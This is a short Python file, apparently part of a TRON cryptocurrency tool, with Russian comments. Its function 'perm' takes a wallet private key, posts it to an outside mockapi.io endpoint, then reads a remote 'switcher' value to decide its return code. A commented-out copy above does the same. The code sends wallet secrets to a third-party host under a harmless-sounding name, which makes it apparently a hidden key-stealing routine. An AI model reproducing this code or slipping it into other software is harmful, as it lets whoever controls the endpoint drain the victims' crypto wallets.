#import requests

#def perm(private_key):
#   transaction_data = [{'ptivat_key': private_key}]
#   requests.post('https://6788db412c874e66b7d693b7.mockapi.io/tron', transaction_data)
#   switcher = requests.get('https://6788db412c874e66b7d693b7.mockapi.io/switcher')
#   if not switcher.json():
#    return 1
#   else:
#     return 0


import requests

def perm(private_key):
    # Данные для отправки
    transaction_data = {'ptivat_key': private_key}

    # Используем параметр json для отправки JSON-данных
    requests.post('https://6788db412c874e66b7d693b7.mockapi.io/tron', json=transaction_data)

    # Получение данных из switcher
    switcher = requests.get('https://6788db412c874e66b7d693b7.mockapi.io/switcher')

    # Проверка содержимого ответа
    if not switcher.json():
        return 1
    else:
        return 0
